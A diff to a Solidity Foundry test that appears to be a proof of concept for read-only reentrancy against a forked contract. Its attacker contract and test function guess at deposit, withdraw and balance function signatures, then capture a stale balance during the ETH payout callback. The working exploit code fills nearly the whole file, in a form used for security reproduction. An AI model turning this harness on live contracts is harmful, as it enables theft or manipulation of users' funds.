@@ -20,24 +20,38 @@ interface IVictim {
 }
 
 contract ReadOnlyAttacker {
-    IVictim public immutable victim;
+    address public immutable victimAddr;
     uint256 public staleValue;
     bool public captured;
+    bytes public withdrawCall;
 
     constructor(address victim_) {
-        victim = IVictim(victim_);
+        victimAddr = victim_;
     }
 
-    function attack() external payable {
-        victim.deposit{value: msg.value}();
-        victim.withdraw();
+    /// Deposit and withdraw shapes are GUESSES on an unverified target, so the
+    /// caller passes them. The capture happens inside the ETH callback, while
+    /// the victim has paid out but not yet updated its accounting.
+    function attack(bytes calldata depositData, bytes calldata withdrawData) external payable {
+        withdrawCall = withdrawData;
+        (bool d,) = victimAddr.call{value: msg.value}(depositData);
+        require(d, "deposit shape reverted for this target");
+        (bool w,) = victimAddr.call(withdrawData);
+        require(w, "withdraw shape reverted for this target");
     }
 
     receive() external payable {
         if (!captured) {
             captured = true;
-            // Mid-callback: victim has sent ETH but not yet updated state.
-            staleValue = victim.balanceOf(address(this));
+            // Mid-callback: the victim has sent ETH but not yet updated state.
+            // The reader is a guess too.
+            (bool ok, bytes memory ret) = victimAddr.staticcall(abi.encodeWithSignature("balanceOf(address)", address(this)));
+            if (ok && ret.length >= 32) {
+                staleValue = abi.decode(ret, (uint256));
+            } else {
+                (ok, ret) = victimAddr.staticcall(abi.encodeWithSignature("balanceOf(address,uint256)", address(this), uint256(0)));
+                if (ok && ret.length >= 32) staleValue = abi.decode(ret, (uint256));
+            }
         }
     }
 }
@@ -59,22 +73,66 @@ contract PoC is Test {
         assertGt(target.code.length, 0, "target has no code at this fork block");
     }
 
+    /// The settled value, via the plausible readers. Never the call result.
+    function _settled(address who) internal view returns (bool found, uint256 v) {
+        (bool ok, bytes memory ret) = target.staticcall(abi.encodeWithSignature("balanceOf(address)", who));
+        if (ok && ret.length >= 32) return (true, abi.decode(ret, (uint256)));
+        (ok, ret) = target.staticcall(abi.encodeWithSignature("balanceOf(address,uint256)", who, uint256(0)));
+        if (ok && ret.length >= 32) return (true, abi.decode(ret, (uint256)));
+        (ok, ret) = target.staticcall(abi.encodeWithSignature("getBalance(address)", who));
+        if (ok && ret.length >= 32) return (true, abi.decode(ret, (uint256)));
+        return (false, 0);
+    }
+
+    /// One (deposit, withdraw) shape pair. Success is the view being STALE
+    /// mid-callback — the read disagreeing with the settled read — never the
+    /// calls returning.
+    function _attemptPair(address attackerEOA, bytes memory dep, bytes memory wd, string memory label)
+        internal
+        returns (uint256 stale, uint256 settled, bool ok2)
+    {
+        ReadOnlyAttacker attacker = new ReadOnlyAttacker(target);
+        vm.prank(attackerEOA);
+        (bool ok,) = address(attacker).call{value: 1 ether}(
+            abi.encodeWithSignature("attack(bytes,bytes)", dep, wd)
+        );
+        console.log("tried", label, ok ? "attack returned" : "attack reverted");
+        if (!ok) return (0, 0, false);
+        (bool found, uint256 v) = _settled(address(attacker));
+        return (attacker.staleValue(), found ? v : 0, true);
+    }
+
     function test_exploit() public {
         address attackerEOA = makeAddr("attacker");
         vm.deal(attackerEOA, 10 ether);
 
-        ReadOnlyAttacker attacker = new ReadOnlyAttacker(target);
-        vm.prank(attackerEOA);
-        attacker.attack{value: 1 ether}();
+        bytes memory d0 = abi.encodeWithSignature("deposit()");
+        bytes memory d1 = abi.encodeWithSignature("deposit(uint256)", uint256(1 ether));
+        bytes memory w0 = abi.encodeWithSignature("withdraw()");
+        bytes memory w1 = abi.encodeWithSignature("withdraw(uint256)", uint256(1 ether));
 
-        uint256 settledValue = IVictim(target).balanceOf(address(attacker));
-        console.log("view mid-callback (stale):", attacker.staleValue());
-        console.log("view after settle:", settledValue);
-        // On a fixed target the view already reflects the withdrawal
-        // mid-callback, so stale == settled and this fails.
+        uint256 stale;
+        uint256 settled;
+        bool ran;
+        bool reproduced;
+        (stale, settled, ran) = _attemptPair(attackerEOA, d0, w0, "deposit() + withdraw()");
+        if (ran) { console.log("stale:", stale, "settled:", settled); if (stale != settled) reproduced = true; }
+        if (!reproduced) {
+            (stale, settled, ran) = _attemptPair(attackerEOA, d0, w1, "deposit() + withdraw(uint256)");
+            if (ran && stale != settled) reproduced = true;
+        }
+        if (!reproduced) {
+            (stale, settled, ran) = _attemptPair(attackerEOA, d1, w0, "deposit(uint256) + withdraw()");
+            if (ran && stale != settled) reproduced = true;
+        }
+        if (!reproduced) {
+            (stale, settled, ran) = _attemptPair(attackerEOA, d1, w1, "deposit(uint256) + withdraw(uint256)");
+            if (ran && stale != settled) reproduced = true;
+        }
+
         assertTrue(
-            attacker.staleValue() != settledValue,
-            "exploit did not reproduce: view was already settled mid-callback"
+            reproduced,
+            "no deposit/withdraw shape left the view stale mid-callback. Tried deposit()/deposit(uint256) with withdraw()/withdraw(uint256). This does NOT establish safety: the functions may be named differently, take other arguments, or the view may not be part of the vulnerable path."
         );
     }
 }
